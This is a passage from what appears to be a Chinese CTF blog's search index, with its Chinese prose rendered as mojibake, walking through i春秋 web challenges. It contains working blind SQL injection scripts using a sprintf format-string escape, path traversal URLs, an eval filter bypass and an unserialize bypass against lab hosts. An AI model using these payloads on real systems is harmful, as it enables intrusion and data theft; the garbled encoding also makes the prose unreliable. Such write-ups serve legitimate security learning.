print(str.decode('utf-8')) cookie_system.append(base64.b64encode(str)) ttmp_new = '' å…³äºè„šæœ¬çš„ç¼–å†™ï¼Œåœ¨ç†è§£å®Œæ±‚è§£æ–¹å¼åï¼Œå…¶å®ç¼–å†™å›°éš¾å°±åœ¨äºè¯­æ³•äº†ï¼Œåœ¨è¿™é‡Œå¯ä»¥è¾“å‡ºæ‰€æœ‰çš„ç»“æœï¼Œå°†å®ƒå¯¼å‡ºä½œä¸ºä¸€ä¸ªçˆ†ç ´å­—å…¸ï¼Œå†ç”¨burpè¿›è¡Œçˆ†ç ´å³å¯ æœ€åè§£å†³ä¸€ä¸ªé—®é¢˜ï¼šè¿™ä¸ªkeyä¸ºä»€ä¹ˆä¸ä¼šæ”¹å˜ï¼Ÿæ˜æ˜åœ¨è§£å¯†å’ŒåŠ å¯†çš„æ—¶å€™éƒ½å‡ºç°äº†è¿ç®—ï¼šé¦–å…ˆé€ æˆè¿™ä¸ªkeyæ”¹å˜çš„åŸå› æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯rndçš„å˜åŒ–ï¼Œè€Œrndçš„å˜åŒ–åªå‡ºç°åœ¨åŠ å¯†å½“ä¸­ï¼Œä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬è¾“å…¥é”™è¯¯çš„cookieçš„æ—¶å€™ä»–æ‰ä¼šresetï¼Œä½†æ˜¯æˆ‘ä»¬åˆ©ç”¨burpè¿›è¡Œé‡æ”¾æ”»å‡»çš„æ—¶å€™ï¼Œé’ˆå¯¹éƒ½æ˜¯ä¸€æ ·çš„cookieï¼Œç›¸å½“äºæ¯æ¬¡æ”»å‡»å®Œå›åˆ°åˆå§‹åŒ–ï¼Œè€Œæˆ‘ä»¬åœ¨pythonä¸­å¯¹äºkeyçš„æ±‚è§£çš„æ—¶å€™ï¼Œè¿™ä¸ªrndå®ƒæ˜¯ä¸æ”¹å˜çš„ï¼Œæ‰€ä»¥è¿™ä¸ªkeyä¹Ÿä¸ä¼šå˜åŒ–ï¼Œåœ¨burpçˆ†ç ´è¿›å…¥åŠ å¯†æ—¶ï¼Œç”±äºè¿™ä¸ªrndæ˜¯æˆªå–æˆ‘ä»¬çš„cookieå‰å‡ ä½æ‰€ä»¥æœ€ç»ˆçš„keyä¹Ÿæ˜¯ä¸å˜çš„ã€‚ ä¸€ç‚¹æ€»ç»“æ„Ÿè§‰å¯¹äºpythonè„šæœ¬çš„ç¼–å†™è¿˜ä¸æ˜¯å¾ˆç†Ÿç»ƒï¼Œæœ‰äº›è¯­æ³•è¿˜ä¸æ˜¯å¾ˆç†Ÿç»ƒã€‚ã€‚ä¸è¿‡ç°åœ¨ä¹Ÿæœ‰æ„Ÿè§‰å¥½åƒç”¨çš„æœ€å¤šçš„æ˜¯ä»€ä¹ˆï¼Œç„¶åå®¡è®¡ä»£ç çš„æ—¶å€™ï¼Œæœç„¶è¿˜æ˜¯è¦é™ä¸‹å¿ƒæ¥å¥½å¥½çœ‹æ‰è¡Œ","link":"/2021/02/16/i%E6%98%A5%E7%A7%8B4/"},{"title":"iæ˜¥ç§‹5","text":"webâ€”â€”Zoneæœ‰ä¸ªç™»å½•ç•Œé¢ä¸€å¼€å§‹è®©æˆ‘ä»¬ç™»å½•ï¼Œè¯•äº†ä¸€ä¸‹ä¸æ˜¯sqlæ³¨å…¥ï¼Œäºæ˜¯æŠ“åŒ…æŸ¥çœ‹ï¼Œåœ¨cookieå‘ç°æœ‰ä¸ªlogin=0ï¼Œå°†å…¶æ”¹æˆ1ï¼Œå‘ç°å¯ä»¥è¿›å…¥ï¼Œæ‰“å¼€manageé¡µé¢ï¼Œè¿™é‡Œè¿˜æ˜¯éœ€è¦åœ¨burpsuitä¸æ–­å°†loginä¿®æ”¹ä¸º1ï¼Œæœ€ç»ˆå³å¯è¿›å…¥ï¼Œå¾—åˆ°ä¸€ä¸ªï¼š 1manages/admin.php?module=..././..././flag.php&amp;name= æ¯”è¾ƒç±»ä¼¼äºæ–‡ä»¶åŒ…å«çš„urlï¼Œä¸€å¼€å§‹æ˜¯../ï¼Œå‘ç°ä¸è®ºå‡ ä¸ªéƒ½æ˜¯å‡ºæ¥çš„ç»“æœéƒ½ä¸€æ ·ï¼Œæ€€ç–‘è¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯å¤å†™ï¼Œå‘ç°é¡µé¢å°±ä¸ä¸€æ ·äº†ï¼Œæ¥ä¸‹æ¥çš„ç›®æ ‡æ˜¯æ‰“å¼€è¿™ä¸ªflag.php åœ¨åˆšåˆšæ•´ç†çš„æ•æ„Ÿä½ç½®ä¸­çš„/etc/passwdä¸­å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ˜¯Nginxç³»ç»Ÿ 123nginx:/etc/nginx/nginx.conf/etc/nginx/sites-enabled/default åœ¨ç¬¬ä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­æ²¡æœ‰å‘ç°å•¥ä¸œè¥¿ï¼Œåœ¨ç¬¬äºŒä¸ªé…ç½®æ–‡ä»¶ä¸­å‘ç°äº†ä¸€äº›ç½‘ç«™ç›®å½•ï¼š 1234567891011121314151617181920212223242526272829303132333435363738 server {â€‹ listen 80 default_server;â€‹ listen [::]:80 default_server ipv6only=on; root /var/www/html; index index.php index.html index.htm; server_name localhost; location / { try_files $uri $uri/ =404; location ~ \\.php$ { fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; #fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; } } error_page 404 /404.html; error_page 500 502 503 504 /50x.html; location = /50x.html { root /var/www/html; } location /online-movies { alias /movie/; autoindex on; } location ~ /\\.ht { deny all; }} nginxæœåŠ¡å™¨çŸ¥è¯†ç‚¹ nginxæœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶æ˜¯nginx.confï¼Œå­˜å‚¨è·¯å¾„ä¸º./etc/nginx/nginx.confï¼› ä¸€èˆ¬æœåŠ¡å™¨å­˜æ”¾è·¯å¾„ä¸º/var/www/html/ï¼› nginx.confæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡includeå…¶ä»–è·¯å¾„æ–‡ä»¶æ¥å¼•ç”¨å…¶ä»–æ–‡ä»¶åŒ…å«çš„é…ç½®ï¼Œæ¯”å¦‚include sites-enabled/default;ï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†æŠŠä¸€äº›é…ç½®è¿›è¡Œåˆ†ç±»ï¼Œæ–¹ä¾¿åœ¨éœ€è¦çš„æ—¶å€™å¿«é€Ÿå¯åŠ¨æˆ–è€…å…³é—­ï¼Œè¿™äº›è·¯å¾„æ˜¯å¯å˜çš„ï¼Œç®¡ç†å‘˜å¯ä»¥è‡ªè¡Œè®¾ç½®ï¼› nginx.confæ–‡ä»¶ä¸­ï¼Œå¦‚æœé…ç½®äº†autoindex on;ï¼Œé‚£ä¹ˆè¯´æ˜è¿™ä¸ªè·¯å¾„å¯ä»¥è¿›è¡Œæµè§ˆç›®å½•ä¸‹è½½æ–‡ä»¶ï¼Œä¾‹å¦‚location /online-movies { alias /movie/; autoindex on; }ä¸­ï¼Œlocation /online-moviesè·¯å¾„å°±å¯ä»¥æµè§ˆç›®å½•ä¸‹è½½æ–‡ä»¶ï¼Œå…¨è·¯å¾„ä¸€èˆ¬æ˜¯/etc/nginx/location/online-moviesï¼› æ–‡ä»¶éå†æ˜¯æŒ‡çš„ä¸€ä¸ªç›®å½•ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œè®¿é—®ï¼› å¼€å¯æ–‡ä»¶éå†æƒé™çš„è·¯å¾„ï¼Œåœ¨è·¯å¾„åè¾¹æ·»åŠ æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„å°±å¯ä»¥ä¸‹è½½åˆ°æ–‡ä»¶ï¼Œåœ¨å¯è§†åŒ–ç•Œé¢è®¿é—®ä¸åˆ°çš„æ–‡ä»¶ä¹Ÿå¯ä»¥è¿›è¡Œä¸‹è½½ï¼Œæ¯”å¦‚/var/www/html/flag.php æ‰€ä»¥åœ¨è¿™é‡Œ ç”±äºå®ƒæœ‰/online-movies ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›è¡Œæµè§ˆç›®å½•ä¸‹è½½æ–‡ä»¶ï¼Œ http://c56bc9b5d3d94306b60d284c36ba4904d5a04f2c66114e60.changame.ichunqiu.com/online-movies../var/www/html/flag.phpè®¿é—®ä¸€ä¸‹URL å°±å¯ä»¥ä¸‹è½½å¾—åˆ°flag.php 123&lt;?php $flag='flag{794b0e81-a517-4d4e-acf0-3d9086915a2d}';echo 'flag_is_here'; webâ€”â€”hello worldè¿™é“é¢˜ç›®æœ‰ç‚¹ç†Ÿæ‚‰ï¼š æœ‰ä¸ªroleï¼Œè§£ç åæ˜¯f:5:&quot;thrfg&quot;;å¥½åƒä¹‹å‰åšè¿‡è¿™é¢˜å§ï¼Œrot13è§£å¯†ä»¥åï¼Œæ”¹ä¸ºadminå†ç™»å½•çœ‹çœ‹ï¼Œå‘ç°è€ƒç‚¹ä¸æ˜¯åœ¨è¿™é‡Œï¼Œçœ‹æºç æœ‰ä¸ªflag.xmas.jså¯ä»¥è®¿é—®ï¼Œåˆ é™¤xmsåå°±å¯ä»¥è®¿é—®äº†ï¼Œç„¶åæ˜¯ä¸€å †çœ‹ä¸æ‡‚çš„ä»£ç  ç„¶åçœ‹äº†ä¸€ä¸‹wpï¼Œè¯´æ˜¯gitæºç æ³„éœ²ï¼Œå› ä¸ºå¯ä»¥çœ‹åˆ°jsçš„æºç ï¼Œäºæ˜¯å°è¯•ç”¨githackå·¥å…·æŠ“å– çœ‹äº†ä¸€ä¸‹wpï¼Œè¯´æ˜¯åº”è¯¥æŠ“å–åˆ°ä¸¤ä¸ªflag.jsï¼Œç„¶åè¿›è¡Œæ¯”å¯¹å°±å¯ä»¥å¾—åˆ°flagï¼Œä½†æ˜¯è¿™é¢˜ï¼Œåªæœ‰ä¸€ä¸ªï¼Ÿï¼Ÿï¼Ÿç›´æ¥è¾“å…¥é‚£ä¸ªflag.js.04bb09ä¹Ÿæ²¡æœ‰å‘ç°ï¼Œå¤§æ¦‚æ²¡äº†å§ï¼Ÿ webâ€”â€”phone numberä¸€å¼€å§‹çš„ç™»å½•ç•Œé¢æ¨æµ‹æ˜¯SQLæ³¨å…¥æ‰€ä»¥å°è¯•äº†ä¸€æ³¢ æ²¡æœ‰æ”¶è·ï¼Œäºæ˜¯åœ¨æ³¨å†Œç•Œé¢å…¥æ‰‹ï¼Œå› ä¸ºæ˜¯phone numberé¢˜ç›®ï¼Œæ‰€ä»¥åœ¨æ‰‹æœºå·çš„åœ°æ–¹åº”è¯¥å¯èƒ½æ€§å¾ˆå¤§ï¼Œè¿›è¡Œæ³¨å…¥è¯•è¯•ï¼šå½“æˆ‘æäº¤ä¸æ˜¯æ•°å­—çš„æ—¶å€™ï¼Œæç¤ºè¦ä¸ºæ•°å­—ï¼Œå°†æ³¨å…¥è¯­å¥è½¬ä¸ºåå…­è¿›åˆ¶è¯•è¯•ï¼šæœ‰å­—ç¬¦é™åˆ¶ï¼Œåªèƒ½è¾“å…¥åä¸€ä½â€”â€”åœ¨å®¡æŸ¥å…ƒç´ é‚£è¾¹æ›´æ”¹ä¸€ä¸‹é™åˆ¶è¯•è¯•ä½†æ˜¯è¿™é¢˜ä¸è®ºæ€ä¹ˆæ³¨å†Œéƒ½æ˜¯dberrorï¼Ÿï¼Ÿï¼Ÿçœ‹äº†ä¸‹è¯„è®ºåŒºä¹Ÿæ˜¯ï¼Œéš¾é“åˆç‚¸äº†ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿç®—äº†ç†è§£æ€è·¯å°±å¥½äº† webâ€”â€”GetFlagç™»å½•ç•Œé¢ï¼Œçœ‹ç€åƒsqlæ³¨å…¥ï¼Œäºæ˜¯å°è¯•1â€™or 1=1# å¯†ç éšæ„ï¼ŒéªŒè¯ç ç”¨ä¹‹å‰å†™è¿‡çš„è„šæœ¬å°±è¡Œäº† 123456789import hashlibs='163e9e'for i in range(1,99999999): a=i i=hashlib.md5(str(i).encode('utf-8')).hexdigest() # print(i) if i[0:6] == str(s): print(a) break å³å¯ç™»å½• 1234a.php:&lt;?php echo &quot;Do what you want to do, web dog, flag is in the web root dir&quot;;?&gt; ç‚¹å¼€æºç ï¼šå‘ç°æœ‰ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ ä½†æ˜¯æ²¡æ‹¿åˆ°çœŸçš„ï¼Œæƒ³èµ·æ¥ä¸Šé¢çš„æºç è¯´flag åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œäºæ˜¯å°è¯•/var/www/html/flag.phpã€/var/www/html/challenges/flag.phpã€/var/www/html/challenges/file/flag.phpéƒ½ä¸è¡Œï¼Œäºæ˜¯å»çœ‹äº†ä¸€ä¸‹wpï¼Œè¯´å°±æ˜¯ç¬¬äºŒä¸ªè·¯å¾„ï¼Œä½†æ˜¯ä¸ºå•¥æ‰“ä¸å¼€==ï¼Œç„¶ååé¢åˆè¯´åœ¨flag.phpé¡µé¢ï¼Œäºæ˜¯æˆ‘ç›´æ¥è®¿é—®flag.phpï¼Œï¼Œå‘ç°æ ¹æœ¬å°±æ²¡è¿™ä¸ªé¡µé¢ï¼Ÿï¼Ÿï¼Ÿæ™•äº†==åæ¥å‘ç° åŸæ¥cè¦å¤§å†™â€¦.. 1234567891011121314151617181920&lt;?php$f = $_POST['flag'];$f = str_replace(array('`', '$', '*', '#', ':', '\\\\', '&quot;', &quot;'&quot;, '(', ')', '.', '&gt;'), '', $f);//è¿‡æ»¤äº†é‚£äº›å­—ç¬¦if((strlen($f) &gt; 13) || (false !== stripos($f, 'return')))//flagçš„é•¿åº¦ä¸èƒ½å¤§äº13ï¼Œä¹Ÿä¸èƒ½æœ‰returnå­—ç¬¦{ die('wowwwwwwwwwwwwwwwwwwwwwwwww');}try{ eval(&quot;\\$spaceone = $f&quot;);}catch (Exception $e){ return false;}if ($spaceone === 'flag'){//å°†spaceoneçš„å€¼å’Œflagä½œæ¯”è¾ƒ echo file_get_contents(&quot;helloctf.php&quot;);}?&gt; evalå‡½æ•°ç‰¹æ€§1evalå‡½æ•°ä¼ å…¥çš„å¿…é¡»æ˜¯æœ‰æ•ˆçš„ PHP ä»£ç ã€‚æ‰€æœ‰çš„è¯­å¥å¿…é¡»ä»¥åˆ†å·ç»“å°¾ã€‚æ¯”å¦‚ 'echo &quot;Hi!&quot;' ä¼šå¯¼è‡´ä¸€ä¸ª parse errorï¼Œè€Œ 'echo &quot;Hi!&quot;;' åˆ™ä¼šæ­£å¸¸è¿è¡Œã€‚ ä¸ºä»€ä¹ˆä¹‹å‰æˆ‘ä»¬å†™ä¸€å¥è¯æœ¨é©¬çš„æ—¶å€™æ²¡æœ‰è¿™æ ·å‘¢ï¼Ÿ å› ä¸ºæˆ‘ä»¬åœ¨å‰é¢åŠ äº†ä¸ª@æ‰€ä»¥è¿™é‡Œéœ€è¦è¾“å…¥çš„æ˜¯flag=flag;ç„¶åç‚¹å‡»æºç ï¼Œå°±å¯ä»¥çœ‹åˆ°flagäº† webâ€”â€”ä¸­å›½è±¡æ£‹1234567&lt;script src=&quot;js/common.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/play.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/AI.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/bill.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;js/[abcmlyx]{2}ctf[0-9]{3}.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/gambit.js&quot;&gt;&lt;/script&gt;&lt;div style=&quot;text-align:center;clear:both&quot;&gt; è¿™é¢˜åˆæ˜¯åªæ˜¯ç›²åŒºäº†ï¼Œçœ‹äº†ä¸€ä¸‹wpï¼Œè¯´æ˜¯jsçš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œ åŸæ¥æ˜¯è¿™æ ·ï¼Œæœ‰ä¸€ä¸ªjsæ–‡ä»¶ï¼Œæ–‡ä»¶åç”±abcmlyxçš„ä¸¤ä¸ªå­—æ¯+ctf+0-9çš„ä¸‰ä¸ªæ•°å­—ç»„æˆï¼Œæ¥ä¸‹æ¥å°±éœ€è¦çˆ†ç ´äº†ç›´æ¥ç”¨burp suitæŠ“åŒ… è¿›è¡Œçˆ†ç ´ ç„¶åé€‰æ‹©çˆ†ç ´æ¨¡å¼:cluster bombåˆ†åˆ«å¯¹å…¶è¿›è¡Œçˆ†ç ´å³å¯ï¼Œç„¶åæ²¡çˆ†ç ´å‡ºæ¥å‘ç° æ˜¯æˆ‘URLæ„é€ é”™äº† åº”è¯¥æ˜¯/js/xxxx.jsï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ ç„¶åå°±å¯ä»¥æ‹¿åˆ°flagäº†","link":"/2021/02/19/i%E6%98%A5%E7%A7%8B5/"},{"title":"iæ˜¥ç§‹6","text":"webâ€”â€”not foundæŠ“åŒ…çœ‹çœ‹è¯·æ±‚æŠ¥æ–‡ï¼Œåœ¨è¿”å›æŠ¥æ–‡ä¸­ç‚¹å¤šäº†æœ‰ä¸ªX-methodï¼Œåˆæ ¹æ®æç¤ºè¯´The requested URL..ï¼ŒçŒœæƒ³ä¼šä¸ä¼šè¯·æ±‚æ–¹æ³•ï¼Œäºæ˜¯å¼€å§‹å°è¯•ï¼š1 GET å‘é€è¯·æ±‚æ¥è·å¾—æœåŠ¡å™¨ä¸Šçš„èµ„æºï¼Œè¯·æ±‚ä½“ä¸­ä¸ä¼šåŒ…å«è¯·æ±‚æ•°æ®ï¼Œè¯·æ±‚æ•°æ®æ”¾åœ¨åè®®å¤´ä¸­ã€‚å¦å¤–getæ”¯æŒå¿«å–ã€ç¼“å­˜ ã€å¯ä¿ç•™ä¹¦ç­¾ç­‰ã€‚å¹‚ç­‰ 2 POST å’Œgetä¸€æ ·å¾ˆå¸¸è§ï¼Œå‘æœåŠ¡å™¨æäº¤èµ„æºè®©æœåŠ¡å™¨å¤„ç†ï¼Œæ¯”å¦‚æäº¤è¡¨å•ã€ä¸Šä¼ æ–‡ä»¶ç­‰ï¼Œå¯èƒ½å¯¼è‡´å»ºç«‹æ–°çš„èµ„æºæˆ–è€…å¯¹ åŸæœ‰èµ„æºçš„ä¿®æ”¹ã€‚æäº¤çš„èµ„æºæ”¾åœ¨è¯·æ±‚ä½“ä¸­ã€‚ä¸æ”¯æŒå¿«å–ã€‚éå¹‚ç­‰ 3 HEAD æœ¬è´¨å’Œgetä¸€æ ·ï¼Œä½†æ˜¯å“åº”ä¸­æ²¡æœ‰å‘ˆç°æ•°æ®ï¼Œè€Œæ˜¯httpçš„å¤´ä¿¡æ¯ï¼Œä¸»è¦ç”¨æ¥æ£€æŸ¥èµ„æºæˆ–è¶…é“¾æ¥çš„æœ‰æ•ˆæ€§æˆ–æ˜¯å¦å¯ä»¥å¯è¾¾ã€æ£€ æŸ¥ç½‘é¡µæ˜¯å¦è¢«ä¸²æ”¹æˆ–æ›´æ–°ï¼Œè·å–å¤´ä¿¡æ¯ç­‰ï¼Œç‰¹åˆ«é€‚ç”¨åœ¨æœ‰é™çš„é€Ÿåº¦å’Œå¸¦å®½ä¸‹ã€‚ 4 PUT å’Œpostç±»ä¼¼ï¼Œhtmlè¡¨å•ä¸æ”¯æŒï¼Œå‘é€èµ„æºä¸æœåŠ¡å™¨ï¼Œå¹¶å­˜å‚¨åœ¨æœåŠ¡å™¨æŒ‡å®šä½ç½®ï¼Œè¦æ±‚å®¢æˆ·ç«¯äº‹å…ˆçŸ¥ é“è¯¥ä½ç½®ï¼›æ¯”å¦‚postæ˜¯åœ¨ä¸€ä¸ªé›†åˆä¸Šï¼ˆ/provinceï¼‰ï¼Œè€Œputæ˜¯å…·ä½“æŸä¸€ä¸ªèµ„æºä¸Šï¼ˆ/province/123ï¼‰ã€‚æ‰€ä»¥putæ˜¯å®‰å…¨çš„ï¼Œ æ— è®ºè¯·æ±‚å¤šå°‘æ¬¡ï¼Œéƒ½æ˜¯åœ¨123ä¸Šæ›´æ”¹ï¼Œè€Œpostå¯èƒ½è¯·æ±‚å‡ æ¬¡åˆ›å»ºäº†å‡ æ¬¡èµ„æºã€‚å¹‚ç­‰ 5 DELETE è¯·æ±‚æœåŠ¡å™¨åˆ é™¤æŸèµ„æºã€‚å’Œputéƒ½å…·æœ‰ç ´åæ€§ï¼Œå¯èƒ½è¢«é˜²ç«å¢™æ‹¦æˆªã€‚å¦‚æœæ˜¯httpsåè®®ï¼Œåˆ™æ— éœ€æ‹…å¿ƒã€‚å¹‚ç­‰ 6 CONNECT HTTP/1.1åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚å°±æ˜¯æŠŠæœåŠ¡å™¨ä½œä¸ºè·³æ¿ï¼Œå»è®¿é—®å…¶ä»–ç½‘é¡µ ç„¶åæŠŠæ•°æ®è¿”å›å›æ¥ï¼Œè¿æ¥æˆåŠŸåï¼Œå°±å¯ä»¥æ­£å¸¸çš„getã€postäº†ã€‚ 7 OPTIONS è·å–httpæœåŠ¡å™¨æ”¯æŒçš„httpè¯·æ±‚æ–¹æ³•ï¼Œå…è®¸å®¢æˆ·ç«¯æŸ¥çœ‹æœåŠ¡å™¨çš„æ€§èƒ½ï¼Œæ¯”å¦‚ajaxè·¨åŸŸæ—¶çš„é¢„æ£€ç­‰ã€‚ 8 TRACE å›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­ã€‚ä¸€èˆ¬ç¦ç”¨ï¼Œé˜²æ­¢è¢«æ¶æ„æ”»å‡» åœ¨ä½¿ç”¨OPTIONSçš„æ—¶å€™ï¼Œå‡ºç°äº†locationf ?f=1.phpçš„è·³è½¬ï¼Œå°è¯•è®¿é—®ï¼Œè®¿é—®ä¸äº†çœ‹äº†ä¸€ä¸‹wp è¯´å¯ä»¥æ‰«æä¸€ä¸‹ç›®å½• çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–æç¤ºä¿¡æ¯æ‰«åˆ°äº†ä¸€ä¸ª.htaccess apacheç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼Œäºæ˜¯ç”¨è¿™ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´æ‰“å¼€è¯•è¯•ï¼Œ æ‰“å¼€è¿™ä¸ªç½‘é¡µè¯•è¯•ï¼šéœ€è¦ä¼ªé€ IPï¼Œè¿™é‡Œè¯´XFF ä½†æ˜¯æˆ‘ç”¨XFFä¼ªé€ IPå è¿˜æ˜¯è¿™ä¸ªé¡µé¢ï¼Œäºæ˜¯æŸ¥äº†ä¸€ä¸‹ è¿˜æœ‰ä»€ä¹ˆ ä¼ªé€ IPçš„æ–¹æ³•:è·å–å®¢æˆ·ç«¯IPï¼Œå¾ˆå¤šä»£ç éƒ½ä¼šæ‹¿ HTTP_CLIENT_IPçš„å€¼ï¼Œå…¶æ¬¡æ‹¿ HTTP_X_FORWARDED_FORï¼Œæœ€åæ˜¯ REMOTE_ADDRã€‚å‚è€ƒï¼šhttps://segmentfault.com/q/1010000000686700/a-1020000000687155æ‰€ä»¥ è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ï¼š webâ€”â€”SQLIçœ‹èµ·æ¥å°±åƒæ˜¯SQLæ³¨å…¥çš„é¢˜ç›®ï¼Œçœ‹çœ‹è¿‡æ»¤äº†å•¥å§: å‘ç°å‡ºç°%ä¼šæŠ¥é”™ï¼Œçœ‹äº†ä¸€ä¸‹wpï¼Œå‘ç°æ˜¯sprintfæ ¼å¼åŒ–å­—ç¬¦ä¸²é€ƒé€¸æ¼æ´äºæ˜¯å­¦ä¹ ä¸€ä¸‹ï¼Œæ„Ÿè§‰å’Œä¹‹å‰çš„å®½å­—èŠ‚æ³¨å…¥å·®ä¸å¤šå‘€ï¼Ÿéƒ½æ˜¯åƒæ‰å­—ç¬¦ï¼Œä½†æ˜¯åˆä¸å¤ªä¸€æ ·: sprintfæ ¼å¼åŒ–å­—ç¬¦ä¸²é€ƒé€¸æ¼æ´åœ¨phpçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œ%åçš„ä¸€ä¸ªå­—ç¬¦(é™¤äº†â€™%â€™)ä¼šè¢«å½“ä½œå­—ç¬¦ç±»å‹ï¼Œè€Œè¢«åƒæ‰ï¼Œå•å¼•å·â€™ï¼Œæ–œæ \\ä¹Ÿä¸ä¾‹å¤–ã€‚ ä½¿ç”¨%1$åƒæ‰åé¢çš„æ–œæ ï¼Œè€Œä¸å¼•èµ·æŠ¥é”™å‚è€ƒï¼šhttps://cloud.tencent.com/developer/article/1669052 ç›´æ¥çœ‹payloadå§:ç”¨æˆ·åæ­£ç¡®å’Œé”™è¯¯è¿”å›çš„å†…å®¹ä¹Ÿä¸ä¸€æ ·ï¼Œæ‰€ä»¥ç›´æ¥çœ‹è„šæœ¬å§:å†™è„šæœ¬è‚¯å®šæ˜¯è¦å…ˆæµ‹è¯•è¯­å¥çš„ï¼Œç„¶åå‘ç° åé¢åªèƒ½ç”¨asciiç  ä¸èƒ½åƒä¹‹å‰ä¸€æ ·ç›´æ¥ç”¨å­—ç¬¦äº†,ç”±äºå¤ªæ‡’ æ‰€ä»¥å°±æ²¡ç›²æ³¨åº“åçš„é•¿åº¦: 12345678910111213141516import requestsimport stringurl=r&quot;http://9e2fcad6c50a4de1be1014554d7c980bef18347a5c9b46b2.changame.ichunqiu.com/&quot;s=requests.session()headers=s.get(url).headersdb_name=''for i in range(1,5): for j in range(65,123): payload=f&quot;admin%1$'and ascii(substr(database(),{i},1))={j}#&quot; data={'username':payload,'password':'admin'} # print(s.post(url,data=data).text) # print(payload) if &quot;password error!&quot; in s.post(url,data=data).text: print(&quot;11111111&quot;) db_name+=chr(j) print(db_name) 1234567891011121314151617import requestsimport stringurl=r&quot;http://9e2fcad6c50a4de1be1014554d7c980bef18347a5c9b46b2.changame.ichunqiu.com/&quot;s=requests.session()headers=s.get(url).headersdb_name=''for i in range(1,33): for j in range(65,126): payload=f&quot;admin%1$'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x666c6167),{i},1))={j}#&quot; data={'username':payload,'password':'admin'} # print(s.post(url,data=data).text) print(payload) if &quot;password error!&quot; in s.post(url,data=data).text: print(&quot;11111111&quot;) db_name+=chr(j) print(db_name) break åˆšè·‘å‡ºäº†è¡¨æ˜¯flagï¼Œå­—æ®µåä¹Ÿæ˜¯flag 1234567891011121314151617import requestsimport stringurl=r&quot;http://9e2fcad6c50a4de1be1014554d7c980bef18347a5c9b46b2.changame.ichunqiu.com/&quot;s=requests.session()headers=s.get(url).headersdb_name=''for i in range(33,50): for j in range(45,126): payload=f&quot;admin%1$'and ascii(substr((select flag from flag),{i},1))={j}#&quot; data={'username':payload,'password':'admin'} # print(s.post(url,data=data).text) print(payload) if &quot;password error!&quot; in s.post(url,data=data).text: print(&quot;11111111&quot;) db_name+=chr(j) print(db_name) break éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œè¿™é‡Œçš„èŒƒå›´ä¸€å¼€å§‹æˆ‘æ˜¯1-33åæ¥å‘ç°è¿˜å‰©ä¸€åŠæ²¡è·‘å‡ºæ¥ äºæ˜¯å°±ç»§ç»­å åŠ ä¸Šå»äº†flag{b5b36121-86dd-a4db-aab3-86ddb749dfa1}æ„Ÿè§‰æ¯æ¬¡åšå®Œè¦å†™è„šæœ¬çš„é¢˜ç›®å°±æƒ³å»ä¸– webâ€”â€”Hashåœ¨æºç ä¸­ç»™åˆ°äº†è¿™æ ·ä¸€å¥è¯: 1&lt;!--$hash=md5($sign.$key);the length of $sign is 8--&gt; f9109d5f83921a551cf859f853afe7bb MD5è§£å¯†åä¸ºkkkkkk01123æ ¹æ®è¿™å¥è¯è¯´ signæ˜¯kkkkkk01 keyæ˜¯123ä»–è¯´you are 123;if you are not 123,you can get the flagæ‰€ä»¥æˆ‘ä»¬æŠŠkeyæ”¹æˆ456 åˆ™ï¼škkkkkk01456 MD5åŠ å¯†åä¸º:æ‰“å¼€çœ‹çœ‹: 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Demo { private $file = 'Gu3ss_m3_h2h2.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { echo @highlight_file($this-&gt;file, true); } function __wakeup() { if ($this-&gt;file != 'Gu3ss_m3_h2h2.php') { //the secret is in the f15g_1s_here.php $this-&gt;file = 'Gu3ss_m3_h2h2.php'; } }}if (isset($_GET['var'])) { $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) { die('stop hacking!'); } else { @unserialize($var); }} else { highlight_file(&quot;Gu3ss_m3_h2h2.php&quot;);}? å¾—åˆ°è¿™æ®µæºç :å…ˆçœ‹çœ‹ä¸‹é¢çš„å§: getä¸€ä¸ªvarå€¼ ç»è¿‡è§£ç ä»¥åï¼Œå¦‚æœè¿™ä¸ªvarå€¼ç»è¿‡æ­£åˆ™åŒ¹é…ï¼ŒåŒ¹é…å†…å®¹ä¸º:å…ˆåŒ¹é…ä¸€ä¸‹ä¸€ä¸ªå­—æ¯oæˆ–è€…cåŒ¹é…å­—ç¬¦:/iæ˜¯ä¸åŒºåˆ†å¤§å°å†™å¦‚æœåŒ¹é…åˆ° 